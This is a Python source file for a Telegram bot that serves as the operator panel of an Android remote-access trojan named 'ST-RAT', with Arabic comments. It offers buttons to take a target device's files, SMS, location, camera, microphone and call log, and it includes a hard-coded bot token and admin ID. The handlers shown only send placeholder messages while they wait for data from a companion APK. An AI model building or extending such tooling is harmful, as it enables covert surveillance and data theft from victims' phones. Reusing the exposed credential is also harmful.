import telebot
from telebot import types
import os

# --- [ الإعدادات - ضع بياناتك هنا ] ---
TOKEN = "7467948843:AAHEqAnxTuJ3ec_t2SirBDNeI3GGNcN3sgY"
ADMIN_ID = 6566686766 

bot = telebot.TeleBot(TOKEN)

# --- [ تصميم لوحة الأزرار - مثل الصور ] ---
def create_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("📱 معلومات الجهاز", callback_data="info"),
        types.InlineKeyboardButton("📁 الحصول على الملفات", callback_data="files"),
        types.InlineKeyboardButton("💬 الرسائل (SMS)", callback_data="sms"),
        types.InlineKeyboardButton("📍 الموقع الجغرافي", callback_data="location"),
        types.InlineKeyboardButton("📸 الكاميرا السلفي", callback_data="cam_f"),
        types.InlineKeyboardButton("🎤 الميكروفون", callback_data="mic"),
        types.InlineKeyboardButton("📞 سجل المكالمات", callback_data="calls"),
        types.InlineKeyboardButton("🔔 إظهار إشعار", callback_data="notif")
    ]
    markup.add(*buttons)
    # زر عريض في الأسفل
    markup.add(types.InlineKeyboardButton("📢 إرسال رسالة للكل", callback_data="broadcast"))
    return markup

# --- [ الأوامر الاستجابية ] ---

@bot.message_handler(commands=['start'])
def welcome(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(
            message.chat.id, 
            "💀 **نظام ST-RAT مفعّل بنجاح**\n"
            "مرحباً بك يا إسلام. البوت الآن في وضع الاستعداد لاستقبال الأجهزة.",
            reply_markup=create_main_markup()
        )

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    # محاكاة الردود التي تظهر في صورك لضمان عمل الواجهة
    if call.data == "info":
        bot.send_message(call.message.chat.id, "🔍 جاري سحب بيانات الجهاز المستهدف...")
        # هنا البوت ينتظر وصول البيانات من الـ APK
    
    elif call.data == "sms":
        bot.send_message(call.message.chat.id, "📩 طلبك قيد المعالجة.. جاري استخراج الرسائل.")

    bot.answer_callback_query(call.id)

# --- [ تشغيل البوت ] ---
print("✅ ST-RAT Bot is Running...")
bot.polling(none_stop=True)
